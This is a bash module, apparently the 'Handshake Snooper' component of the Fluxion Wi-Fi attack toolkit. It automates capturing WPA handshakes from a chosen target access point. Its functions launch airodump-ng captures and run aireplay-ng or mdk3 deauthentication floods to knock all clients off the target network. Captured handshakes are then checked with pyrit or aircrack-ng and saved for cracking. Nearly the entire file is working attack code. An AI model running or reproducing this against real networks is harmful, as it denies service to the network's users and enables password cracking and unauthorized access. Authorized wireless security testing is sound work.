#!/bin/bash

########################### < Handshake Snooper Parameters > ###########################

HandshakeSnooperState="Not Ready"

################################# < Handshake Snooper > ################################
function handshake_verifier_daemon() {
	if [ ${#@} -lt 5 ]; then return 1; fi

	handshakeVerifierState="running"

	function handle_verifier_abort() {
		handshakeVerifierState="aborted"
	}

	trap handle_verifier_abort SIGABRT

	source lib/HashUtils.sh

	local handshakeCheckResult=1 # Assume invalid
	while [ $handshakeCheckResult -ne 0 -a "$handshakeVerifierState" = "running" ]; do
		sleep 3
		pyrit -r $4 -o ${4/.cap/-clean.cap} stripLive
		hash_check_handshake $3 ${4/.cap/-clean.cap} "${@:5:2}"
		handshakeCheckResult=$?
	done

	# If handshake didn't pass verification, it was aborted.
	if [ $handshakeCheckResult -ne 0 ]; then return 1; fi

	# Assure we've got a directory to store hashes into.
	local hashDirectory=$(dirname "$2")
	if [ ! -d "$hashDirectory" ]; then
		mkdir -p "$hashDirectory"
	fi

	# Move handshake to storage if one was acquired.
	mv "${4/.cap/-clean.cap}" "$2"

	# Signal parent process the verification terminated.
	kill -s SIGABRT $1
}

function handshake_stop_verifier() {
	if [ "$HANDSHAKEVerifierPID" ]; then
		kill -s SIGABRT $HANDSHAKEVerifierPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKEVerifierPID=""
}

function handshake_start_verifier() {
	handshake_verifier_daemon $$ \
	$FLUXIONPath/attacks/Handshake\ Snooper/handshakes/$APTargetSSIDClean-$APTargetMAC.cap \
	$HANDSHAKEVerifier $FLUXIONWorkspacePath/capture/dump-01.cap \
	"$APTargetSSID" "$APTargetMAC" &> $FLUXIONOutputDevice &
	HANDSHAKEVerifierPID=$!
}

function handshake_stop_deauthenticator() {
	if [ "$HANDSHAKEDeauthenticatorPID" ]; then
		kill $HANDSHAKEDeauthenticatorPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKEDeauthenticatorPID=""
}

function handshake_start_deauthenticator() {
	if [ "$HANDSHAKEDeauthenticatorPID" ]; then return 0; fi

	# Prepare deauthenticators
	case "$HANDSHAKEMethod" in
		"mdk3"*) echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst
	esac

	# Start deauthenticators.
	case "$HANDSHAKEMethod" in
		"aireplay-ng"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
						aireplay-ng --deauth=9999999999 -a $APTargetMAC --ignore-negative-one $WIMonitor &
			HANDSHAKEDeauthenticatorPID=$!;;
		"mdk3"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
				 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel &
			HANDSHAKEDeauthenticatorPID=$!;;
	esac
}

function handshake_stop_captor() {
	if [ "$HANDSHAKECaptorPID" ]; then
		kill $HANDSHAKECaptorPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKECaptorPID=""
}

function handshake_start_captor() {
	if [ "$HANDSHAKECaptorPID" ]; then return 0; fi

	xterm -hold -title "Handshake Captor (CH $APTargetChannel)" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e \
	airodump-ng -d $APTargetMAC -w $FLUXIONWorkspacePath/capture/dump -c $APTargetChannel -a $WIMonitor &

	sleep 3
	HANDSHAKECaptorPID=$(ps a | awk '$5~/^airodump-ng/ && $7~/'"$APTargetMAC"'/{print $1}')
}

function handshake_unset_method() {
	HANDSHAKEMethod=""
}

function handshake_set_method() {
	if [ "$HANDSHAKEMethod" ]; then return 0; fi

	local methods=("Monitor (${CYel}passive$CClr)" "aireplay-ng deauthentication (${CRed}aggressive$CClr)" "mdk3 deauthentication (${CRed}aggressive$CClr)" "$general_back")
	io_query_choice "Select a method of handshake retrieval" methods[@]

	HANDSHAKEMethod=$IOQueryChoice

	if [ "$HANDSHAKEMethod" = "$general_back" ]; then
		handshake_unset_method
		return 1
	fi
}

function handshake_unset_verifier() {
	HANDSHAKEVerifier=""
}

function handshake_set_verifier() {
	if [ "$HANDSHAKEVerifier" ]; then return 0; fi

	local verifiers=("pyrit" "aircrack-ng" "$general_back") # "pyrit (${CGrn}recommended$CClr)" "aircrack-ng (unreliable)")
	io_query_choice "Select a method of handshake retrieval" verifiers[@]

	HANDSHAKEVerifier=$IOQueryChoice

	if [ "$HANDSHAKEVerifier" = "$general_back" ]; then
		handshake_unset_verifier
		handshake_unset_method
		return 1
	fi
}

function unprep_attack() {
	HandshakeSnooperState="Not Ready"
	handshake_unset_verifier
	handshake_unset_method

	sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"
}

function prep_attack() {
	# if [ ${#@} -ne 3 ]; then return 1; fi

	mkdir $FLUXIONWorkspacePath/capture

	while true; do
		handshake_set_method;	if [ $? -ne 0 ]; then break; fi
		handshake_set_verifier;	if [ $? -ne 0 ]; then continue; fi
		HandshakeSnooperState="Ready"
		break
	done

	# Check for handshake abortion.
	if [ "$HandshakeSnooperState" = "Not Ready" ]; then
		unprep_attack
		return 1;
	fi
}

function stop_attack() {
	handshake_stop_deauthenticator
	handshake_stop_verifier
	handshake_stop_captor
	handshake_unset_verifier
}

# Parameters: path, SSID, MAC
function start_attack() {
	handshake_start_captor
	handshake_start_deauthenticator
	handshake_start_verifier
}
# FLUXSCRIPT END
